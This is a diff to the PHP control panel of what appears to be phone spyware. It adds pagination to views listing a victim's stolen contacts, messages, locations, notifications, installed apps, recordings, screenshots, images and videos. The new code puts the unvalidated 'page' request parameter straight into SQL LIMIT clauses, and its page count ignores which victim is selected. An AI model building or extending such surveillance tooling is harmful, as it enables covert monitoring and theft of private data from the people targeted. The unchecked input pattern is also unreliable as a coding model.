@@ -23,6 +23,9 @@ class ControlPanel extends Base
     /** @var string $webSocketURI Web Socket URI */
     private string $webSocketURI = "ws://localhost:8080";
 
+    /** @var int $resultsPerPage Number of items to show in a page */
+    private int $resultsPerPage = 20; 
+
     public function __construct()
     {
         parent::__construct();
@@ -65,7 +68,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'contacts' => $contacts,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("CONTACT")
             ]
         );
     }
@@ -121,7 +125,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'images' => $images,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("IMAGE")
             ]
         );
     }
@@ -149,7 +154,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'installedApps' => $installedApps,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("INSTALLED_APP")
             ]
         );
     }
@@ -177,7 +183,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'knownLocations' => $knownLocations,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("LOCATION")
             ]
         );
     }
@@ -205,7 +212,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'messages' => $messages,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("MESSAGE")
             ]
         );
     }
@@ -233,7 +241,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'notifications' => $notifications,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("NOTIFICATION")
             ]
         );
     }
@@ -289,7 +298,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'recordings' => $recordings,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("RECORDING")
             ]
         );
     }
@@ -345,7 +355,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'screenshots' => $screenshots,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("SCREENSHOT")
             ]
         );
     }
@@ -401,7 +412,8 @@ class ControlPanel extends Base
             [
                 'webSocketID' => $webSocketID,
                 'videos' => $videos,
-                'device' => $device
+                'device' => $device,
+                'numberOfPages' => $this->getNumberOfPages("VIDEO")
             ]
         );
     }
@@ -532,8 +544,14 @@ class ControlPanel extends Base
      */
     private function getContacts(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+            
         $contacts = [];
-        $query = "SELECT * FROM CONTACT WHERE client_id=?";
+        $query = "SELECT * FROM CONTACT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -556,8 +574,14 @@ class ControlPanel extends Base
      */
     private function getImages(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $images = [];
-        $query = "SELECT * FROM IMAGE WHERE client_id=?";
+        $query = "SELECT * FROM IMAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -580,8 +604,14 @@ class ControlPanel extends Base
      */
     private function getInstalledApps(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $installedApps = [];
-        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=?";
+        $query = "SELECT * FROM INSTALLED_APP WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -604,8 +634,14 @@ class ControlPanel extends Base
      */
     private function getKnownLocations(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $knownLocations = [];
-        $query = "SELECT * FROM LOCATION WHERE client_id=?";
+        $query = "SELECT * FROM LOCATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -630,8 +666,14 @@ class ControlPanel extends Base
      */
     private function getMessages(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $messages = [];
-        $query = "SELECT * FROM MESSAGE WHERE client_id=?";
+        $query = "SELECT * FROM MESSAGE WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -655,8 +697,14 @@ class ControlPanel extends Base
      */
     private function getNotifications(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $notifications = [];
-        $query = "SELECT * FROM NOTIFICATION WHERE client_id=?";
+        $query = "SELECT * FROM NOTIFICATION WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -680,8 +728,14 @@ class ControlPanel extends Base
      */
     private function getRecordings(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $recordings = [];
-        $query = "SELECT * FROM RECORDING WHERE client_id=?";
+        $query = "SELECT * FROM RECORDING WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -704,8 +758,14 @@ class ControlPanel extends Base
      */
     private function getScreenshots(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $screenshots = [];
-        $query = "SELECT * FROM SCREENSHOT WHERE client_id=?";
+        $query = "SELECT * FROM SCREENSHOT WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -728,8 +788,14 @@ class ControlPanel extends Base
      */
     private function getVideos(int $victimID): array
     {
+        $page = 1;
+        if (isset($_GET['page']))
+            $page = $_GET['page']; 
+        
+        $pageFirstResult = ($page - 1) * $this->resultsPerPage; 
+
         $videos = [];
-        $query = "SELECT * FROM VIDEO WHERE client_id=?";
+        $query = "SELECT * FROM VIDEO WHERE client_id=? LIMIT ". $pageFirstResult . ',' . $this->resultsPerPage;
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
@@ -804,5 +870,20 @@ class ControlPanel extends Base
             return $rows[0]['model'] . " " . $rows[0]['device_id'];
 
         return "";
+    }
+
+    /**
+     * Get the number of pages to be gotten from table
+     * 
+     * @param string $table
+     * 
+     * @return int
+     */
+    private function getNumberOfPages(string $table): int
+    {
+        $query = "SELECT * FROM $table";
+        $rows = $this->database->select($query, []);
+
+        return ceil(count($rows) / $this->resultsPerPage);
     }
 }
